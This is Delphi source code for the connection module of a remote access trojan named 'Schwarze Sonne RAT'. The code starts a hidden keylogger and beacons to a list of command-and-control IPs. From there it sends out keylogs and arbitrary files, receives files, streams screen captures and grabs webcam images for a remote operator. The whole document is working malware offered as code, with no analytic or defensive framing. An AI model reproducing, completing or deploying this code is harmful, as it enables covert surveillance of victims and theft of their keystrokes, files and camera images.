{
Schwarze Sonne RAT - Connection Unit
}
unit uConnection;
{$DEFINE DEBUG}
{$DEFINE BETATEST}
interface
uses
      sysutils,
      socketunit,
      uScreenshot,
      uCommands,
      windows,
      uParser,
      uEncryption,
      uFunctions,
      uKeylogger,
      Classes,
      ZLib,
      Graphics,
      uCamHelper,
      uInstallation,
      jpeg;
type
  TServer = class(TThread)
  private

  public
    constructor Create;
  protected
    procedure Execute; override;
  end;

var
  sKeylogPath:string;
  sHost:String;
  cSocket:TClientSocket;
  lKeyLoggerThreadID:Cardinal;
  
type
  LPSocketHeader = ^TCustomPacketHeader;
  TCustomPacketHeader = packed record
    bFlag:Byte;
    dwPackLen:DWORD;
    bPackType:Byte;
  end;
  TInfo = record
    scHost:string[255];
    scData:string[255];
    scPort:Integer;
    scPackHead:Byte;
  End;
  TPacketInformation = packed record
    PacketFinished:Boolean;
    PacketByte:Byte;
    PacketCommand:String;
    PacketLeft:String;
  end;
  PInfo = ^TInfo;

procedure DoConnectionJob(P: Pointer);
Function SendPacket(mSock:TClientSocket;bCommand:Byte;sString:String):Boolean;
function VerifyPacket(sInput:String):TPacketInformation;
implementation

function VerifyPacket(sInput:String):TPacketInformation;
var
  dwPackLen, dwRealLen:DWORD;
  sString:String;
  pData:Pointer;
  lPackLen:Integer;
  tempFlag:Byte;
begin
  lPackLen := Length(sInput);
  dwPackLen := lPackLen - SizeOf(TCustomPacketHeader);
  pData := @sInput[1];
  Result.PacketByte := LPSocketHeader(pData)^.bPackType;
  tempFlag := LPSocketHeader(pData)^.bFlag;
  dwRealLen := LPSocketHeader(pData)^.dwPackLen;
  Result.PacketFinished := False;
  If dwRealLen <= dwPackLen then begin
    Delete(sInput,1,6);
    sString := copy(sInput,1,dwRealLen);
    Result.PacketCommand := sString;
    Result.PacketFinished := True;
    Delete(sInput,1,dwRealLen);
  end;
  Result.PacketLeft := sInput;
end;

Function SendPacket(mSock:TClientSocket;bCommand:Byte;sString:String):Boolean;
var
  lSent, lPackLen:Cardinal;
  cHeader :TCustomPacketHeader;
  dwBuffLen:Cardinal;
begin
  try
    Result := False;
    dwBuffLen := Length(sString);
    lPackLen :=  SizeOf(TCustomPacketHeader);
    cHeader.bFlag := $01;
    cHeader.dwPackLen := DWORD(dwBuffLen);
    cHeader.bPackType := bCommand;
    lSent := mSock.SendBuffer(cHeader,lPackLen);
    If lSent = lPackLen then begin
      lSent := mSock.SendBuffer(sString[1],dwBuffLen);
      If lSent = dwBuffLen then
        Result := True;
    End;
  except
    Result := False;
  end;
end;


procedure DoConnectionJob(P: Pointer);
label cleanup;
Var
  cSock: TClientSocket;
  scHost, scSendData, scFirstData, scFullData:String;
  sBuff, sString:String;
  bPackInfos:TPacketInformation;
  scByte, sComm:Byte;
  sBitMap:TBitmap;
  sJPEG:TJPEGImage;
  fFile:TFileStream;
  scPort,lRecvLen, cRead, x,y:Integer;
  arrBuffer:array[0..1000] of Byte;
  bBuff:array[0..4095] of Byte;
  eRatio:Extended;
  sFirstCap, sDifCap, sSecondCap, sCompStream:TMemoryStream;
  pCompStream:TCompressionStream;
Begin
  scHost := PInfo(P)^.scHost;
  scSendData := PInfo(P)^.scData;
  scPort := PInfo(P)^.scPort;
  scByte := PInfo(P)^.scPackHead;
  sFirstCap := TMemoryStream.Create;
  sSecondCap := TMemoryStream.Create;
  cSock := TClientSOcket.Create;
  cSock.Connect(scHost,scPort);
  if cSock.Connected then begin
    scFirstData := scSendData;
    If SendPacket(cSock,scByte, scFirstData) then begin
      repeat
        scFullData := '';
        ZeroMemory(@arrBuffer[0], 1001);
        lRecvLen := cSock.ReceiveBuffer(arrBuffer[0],1001);
        if cSock.Connected = false then break;
        SetLength(sBuff,lRecvLen);
        MoveMemory(@sBuff[1],@arrBuffer[0],lRecvLen);
        scFullData := scFullData + sBuff;
        repeat
          bPackInfos := VerifyPacket(scFullData);
          scFullData := bPackInfos.PacketLeft;
          sString := bPackInfos.PacketCommand;
          sComm := bPackInfos.PacketByte;
          if bPackInfos.PacketFinished = False then
            break;
          case sComm of
            PACK_KEYLOGSEND:
              begin
                if FileExists(sKeylogPath) then begin
                  try
                    fFile := TFileStream.Create(sKeylogPath , fmOpenRead);
                    Repeat
                      ZeroMemory(@bBuff[0],4096);
                      cRead := fFile.Read(bBuff[0],Length(bBuff));
                      If (cRead <= 0) Then Break;
                      If cSock.SendBuffer(bBuff[0],cRead) <= 0 then break;
                    Until 1 = 3;
                    fFile.Free;
                    DeleteFile(PChar(sKeylogPath));
                  except
                  end;
                end;
                goto cleanup;
              end;
            PACK_QUERYCOMPRESSEDFILE:
              begin
                if FileExists(sString) then begin
                  try
                    sFirstCap.LoadFromFile(sString);
                    sFirstCap.Position := 0;
                    sCompStream := TMemoryStream.Create;
                    pCompStream := TCompressionStream.Create(clMax,sCompStream);
                    pCompStream.CopyFrom(sFirstCap, sFirstCap.Size);
                    pCompStream.Free;
                    sString := '';
                    SetLength(sString,sCompStream.Size);
                    SendPacket(cSock,PACK_COMPRESSEDTRANSFERFILE,IntToStr(sCompStream.Size));
                    sCompStream.Position := 0;
                    sCompStream.Read(sString[1],sCompStream.Size);
                    SendPacket(cSock,PACK_COMPRESSEDDOWNLOADFILE,sString);
                  except
                    SendPacket(cSock,PACK_COMPRESSEDTRANSFERFILE,IntToStr(0));
                  end;
                  goto cleanup;
                end;
              end;
            PACK_QUERYFILE:
              begin
                if FileExists(sString) then begin
                  try
                    sFirstCap.LoadFromFile(sString);
                    sFirstCap.Position := 0;
                    sString := '';
                    SetLength(sString,sFirstCap.Size);
                    SendPacket(cSock,PACK_DOWNLOADFILE,IntToStr(sFirstCap.Size));
                    sFirstCap.Read(sString[1],sFirstCap.Size);
                    SendPacket(cSock,PACK_TRANSFERFILE,sString);
                  except
                    SendPacket(cSock,PACK_DOWNLOADFILE,IntToStr(0));
                  end;
                  goto cleanup;
                end;
                if FileExists(sString) then begin
                  try
                    fFile := TFileStream.Create(sString, fmOpenRead);
                    Repeat
                      ZeroMemory(@bBuff[0],4096);
                      cRead := fFile.Read(bBuff[0],Length(bBuff));
                      If (cRead <= 0) Then Break;
                      If cSock.SendBuffer(bBuff[0],cRead) <= 0 then break;
                    Until 1 = 3;
                    fFile.Free;
                  except
                  end;
                end;
                goto cleanup;
              end;
            PACK_FILESTART:
              begin
                try
                  fFile := TFileStream.Create(sString, fmCreate);
                  Repeat
                    ZeroMemory(@bBuff[0],4096);
                    cRead := cSock.ReceiveBuffer(bBuff[0],4096);
                    if cRead <= 0 then break;
                    fFile.Write(bBuff,cRead);
                  Until 1 = 3;
                  fFile.Free;
                except
                end;
                goto cleanup;
              end;
            PACK_STARTVNC:
              begin
                sFirstCap.Clear;
                sSecondCap.Clear;
                try
                  eRatio := StrToInt(sString) / 100;
                except
                  eRatio := 0.5;
                end;
                sBitMap := TBitmap.Create;
                sBitmap.Handle := CaptureWND(0,eRatio,x,y);
                sBitmap.PixelFormat := pf8bit;
                sBitmap.SaveToStream(sFirstCap);
                sBitmap.Free;
                if sFirstCap.Size > 0 then begin
                  sCompStream := TMemoryStream.Create;
                  sFirstCap.Seek(0, soBeginning);
                  try
                    pCompStream := TCompressionStream.Create(clMax,sCompStream);
                    pCompStream.CopyFrom(sFirstCap, sFirstCap.Size);
                    pCompStream.Free;
                    sCompStream.Position := 0;
                    SetLength(sString,sCompStream.Size);
                    SendPacket(cSock,PACK_STARTVNC,'');
                    cRead := sCompStream.Read(sString[1],sCompStream.Size);
                    SendPacket(cSock,PACK_VNCPROCESS,sString);
                    sBuff := '';
                    sCompStream.Free;
                  except
                  end;
                end;
              end;
            PACK_VNCDATA:
              begin
                eRatio := StrToInt(sString) / 100;
                sBitMap := TBitmap.Create;
                sBitmap.Handle := CaptureWND(0,eRatio,x,y);
                sBitmap.PixelFormat := pf8bit;
                sBitmap.SaveToStream(sSecondCap);
                sBitmap.Free;
                if sSecondCap.Size > 0 then begin
                  sCompStream := TMemoryStream.Create;
                  sDifCap := TMemoryStream.Create;
                  sSecondCap.Seek(0,soFromBeginning);
                  sFirstCap.Seek(0, soFromBeginning);
                  CompareStream(sFirstCap, sSecondCap,sDifCap);
                  sSecondCap.SaveToStream(sFirstCap);
                  sDifCap.Seek(0, soFromBeginning);
                  pCompStream := TCompressionStream.Create(clMax,sCompStream);
                  pCompStream.CopyFrom(sDifCap, sDifCap.Size);
                  pCompStream.Free;
                  sCompStream.Position := 0;
                  SetLength(sString,sCompStream.Size);
                  cRead := sCompStream.Read(sString[1],sCompStream.Size);
                  SendPacket(cSock,PACK_VNCDELTA,sString);
                  sCompStream.Free;
                  sDifCap.Free;
                end;
              end;
            PACK_GETCAMLIST:
              begin
                sBuff := camhelper.GetCams;
                SendPacket(cSock,PACK_GETCAMLIST,sBuff);
              end;
            PACK_STARTCAM:
              begin
                CamHelper.StartCam(StrToInt(sString) + 1);
                if CamHelper.Started then
                  sBuff := '1'
                else
                  sBuff := '0';
                SendPacket(cSock,PACK_STARTCAM,sBuff);
              end;
            PACK_GETCAM:
              begin
                sBitmap := TBitmap.Create;
                sJPEG := TJPEGImage.Create;
                sCompStream := TMemoryStream.Create;
                If CamHelper.GetImage(sBitmap) then begin
                  try
                    sJPEG.CompressionQuality := 50;
                    sJPEG.Assign(sBitmap);
                    sJPEG.Compress;
                    sJpeg.SaveToStream(sCompStream);
                    sCompStream.Position := 0;
                    SetLength(sString,sCompStream.Size);
                    sCompStream.Read(sString[1],sCompStream.Size);
                    SendPacket(cSock,PACK_CAMDATA,sString);
                  except
                  end;
                end;
                sCompStream.Free;
                sBitmap.Free;
                sJPEG.Free;
              end;
            PACK_STOPCAM:
              begin
                Camhelper.StopCam;
              end;
          end;
        until scFullData = '';
      until 1 = 3;
    end;
  end;
  cleanup:
    try
      sFirstCap.Free;
      sSecondCap.Free;
    except
    end;
  FreeMem(p);
  cSock.Disconnect;
End;

procedure KeyloggerThread;
var
  mKeyLgr:TKeylogger;
begin
  mKeyLgr := TKeylogger.Create;
  mKeyLgr.sKeylogPath := sKeylogPath;
  mKeyLgr.KeyloggerStart;
end;

procedure SetupKeylogger;
begin
  sKeylogPath := GetCurrentDir + '\_temp.dat';
  CreateThread(nil,0,@KeyloggerThread,nil,0,lKeyLoggerThreadID);
end;

constructor TServer.Create;
begin
  inherited Create(True);
  FreeOnTerminate := True;
  CamHelper := TCamHelper.Create;
  Resume;
end;

procedure TServer.Execute;
var
  sFirstData:String;
  i:integer;
begin
//{$DEFINE DEMO}
{$IFDEF DEMO}
 WriteLn('**************** Micton RAT - DEMO ****************');
 WriteLn('Please press enter to continiue execution...');
 Readln;
 WriteLn('Micton RAT - DEMO starting...');
{$ENDIF}

  Setup;
  SetupKeylogger;
  repeat
    for i := 0 to Length(SET_LIST_IPS) - 1 do begin
      sHost := SET_LIST_IPS[i];
      try
        cSocket := TClientSocket.Create;
        cSocket.Connect(sHost,SET_INT_PORT);
        If cSocket.Connected Then begin
          sFirstData := GetInfos;
          If SendPacket(cSocket,PACK_AUTH, sFirstData) then begin
            ParseCommand(cSocket);
          end;
        end;
        cSocket.Disconnect;
        cSocket.Free;
        Sleep(SET_INT_SLEEP);
      except
      end;
    end;
  until 1 = 3;
end;
end.
